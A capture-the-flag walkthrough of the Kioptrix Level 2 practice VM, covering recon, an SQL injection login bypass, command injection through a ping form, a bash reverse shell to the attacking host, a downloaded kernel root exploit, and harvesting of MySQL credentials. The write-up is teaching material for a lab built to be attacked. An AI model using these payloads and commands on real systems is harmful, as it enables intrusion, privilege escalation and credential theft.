> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Kioptrix Level 2 VirtualBox Setup

If you wish to use the virtual machine image in Oracle VirtualBox you will need to do the following steps to avoid a "Kernel Panic" error.
1. Create a new VM and choose not to use a disk
2. In “Settings -> Storage”, remove the SATA controller entirely and under the IDE controller add an new (existing) disk - and select the VMDK.
3. Under “Settings -> Audio” untick “Enable Audio”
4. Under “Settings -> Network” expand “Advanced” and change the Adaptor Type to “PCnet-PCI II (Am79c970A)”
5. Under “Settings -> Ports -> USB” untick “Enable USB Controller”

## Initial recon
### Nmap scan

We start initial active recon with an fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap 10.0.2.6-A -T4 -vv -p-  -oA tcp_agg_all_ports
```

We can also run a quick (-T4) aggressive (-A) version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap 10.0.2.6 -sUV -T4 -A -vv -oA udp_fast_ver_top_1000
```

Nothing interesting found in our UDP scan.

Run a Nikto scan to see if it reveals any interesting bits of information that we can use.

Looking at the nikto results there isn't much that is of particular interest that stands out besides the outdated Apache Server version of (2.0.52)

We can look to see if this version is vulnerable to any particular exploits.

[Apache 2.0.52 Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-15944/Apache-Http-Server-2.0.52.html)

This might be worth a try.

[Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow](https://www.exploit-db.com/exploits/2237)
[Apache mod-rewrite MSF exploit code](https://packetstormsecurity.com/files/62377/apache-mod-rewrite.rb.txt.html)


### Web page - SQL Injection

Browsing the web page we are greeted by a simple "Remote System Administration Login" page.

![Login Page](/Images/vh_kioptrix2_webpage_1.jpg)

You can try simple default username and password combinations but none seem to work.

Lets try bypass the login by issuing some SQL injection escape sequences.

Enter the below values into the password field to bypass the authentication logic and use **"admin"** as the username.
```
' OR 1=1 -- -
```

The reason why this works is due to the insecure PHP SQL query code logic being used within the application.
```
# This is the original source code for the login
$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";

# When we enter in our above values it bypasses the password check and evaluates to true because of our OR 1=1 statement
$query = "SELECT * FROM users WHERE username = 'admin' AND password='' OR 1=1 -- -'";
```

This can be avoided by using parameterized queries coding technique.

Now that we are in the application it looks like we have a web console that issues the ping command on the target system.

Lets see if we can abuse this for command execution by chaining extra commands into the input using the semi-colon *;* followed by our command we want to execute.

```
# Lets see if it will cat out the passwd file.
10.0.2.4; cat /etc/passwd
```

![Web console](/Images/vh_kioptrix2_webpage_2.jpg)

Looks like we have command execution.

![Command execution results](/Images/vh_kioptrix2_webpage_3.jpg)

Use the following command to open a reverse shell back to the attacking machine.
```
; bash -i >& /dev/tcp/10.0.2.4/1337 0>&1
```

Make sure to set up a listener on the attacking machine.
```
nc -nvlp 1337
```

## Privilege Escalation

![Initial Shell](/Images/vh_kioptrix2_initial_shell.jpg)

Looks like we have gained an initial shell on the system as the **apache** user.

Check the Linux Kernel version by using the following command
```
uname -a
```

This reveals that this system has quite an old linux kernel version.

> Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

This command reveals the Linux distribution
```
cat /etc/*-release
```

The results say we are running CentOS 4.5

> CentOS release 4.5 (Final)

Go to [exploitdb.com](https://www.exploit-db.com/) and search for **Linux 2.6 centos** which should display the following results.

![Exploit DB results](/Images/vh_kioptrix2_privesc_1.jpg)

The one the looks most appropriate and matches our Linux Kernel version and distribution is:

**Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)**

[Exploit Link](https://www.exploit-db.com/exploits/9542)

Lets download and compile the exploit on our target system.

```
cd /tmp
wget http://10.0.2.4/exploit.c
gcc -o exploit exploit.c
id
./exploit.c
id
```

![Linux Kernel Exploit](/Images/vh_kioptrix2_privesc_2.jpg)

As you can see the Kernel Exploit works and we now have root permissions.

## SQL treasure hunting.

Lets first inspect the web sites source code to find database credentials as we know that the website is using SQL to validate the login credentials.

```
cd /var/www/html
cat index.php
```

Here is a part of the index.php source code, as you can see we have the database username and password here which we can use to explore the MySQL database.

```php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }
?>
```

Here is the pingit.php source code. As you can see it uses **shell_exec()** method which is vulnerable to command injection if the users input it not sanitized correctly.

```php
<?php

print $_POST['ip'];
if (isset($_POST['submit'])){
        $target = $_REQUEST[ 'ip' ];
        echo '<pre>';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '</pre>';
    }
?>
```

### Login to SQL database

```
# On the target system execute the following to get into a mysql console session
mysql -u john -phiroshima

# List all databases on the server
show databases;

# Switch to each database you wish to inspect.
use mysql;
use test;
use webapp;

# Show tables in the database
show tables;

# Use select statements to view the contents of interesting tables
select * from user;
select * from users;
```

![MySQL Console](/Images/vh_kioptrix2_mysql1.jpg)

Looking at the default mysql database and users table we find that john and root both have the same password. Thus we can use john's password to also log in as root and change permissions to allow us to access the database remotely.

![MySQL Users table](/Images/vh_kioptrix2_mysql2.jpg)

If you login to the mysql console as root using john's password and then apply the following command you should be able to login and access the mysql console from your attacking machine.
Make sure to replace the IP address to your attacking machine.

```
mysql -u root -phiroshima
use mysql;
GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.0.2.4';
```

On you attacking machine you can now connect to the mysql database directly as root
```
mysql -h 10.0.2.6 -u root
```

![MySQL connection](/Images/vh_kioptrix2_mysql3.jpg)

We can also check and see what the users were previously doing by inspecting the **.mysql_history** file

```
find / -name ".mysql_history"
cat /root/.mysql_history
```

![MySQL History](/Images/vh_kioptrix2_mysql4.jpg)

## Summary

Getting the initial foothold into the system was quite easy as it involved a simple SQL injection bypass string. The web console also allowed us to gain command execution on the system easily by chaining in commands. As the linux kernel is quite outdated it seemed like the most appropriate avenue for privilege escalation and we easily found the correct kernel exploit to escalate our privileges to root. Once we had a shell on the system we could enumerate the database to see what goodies it had inside.
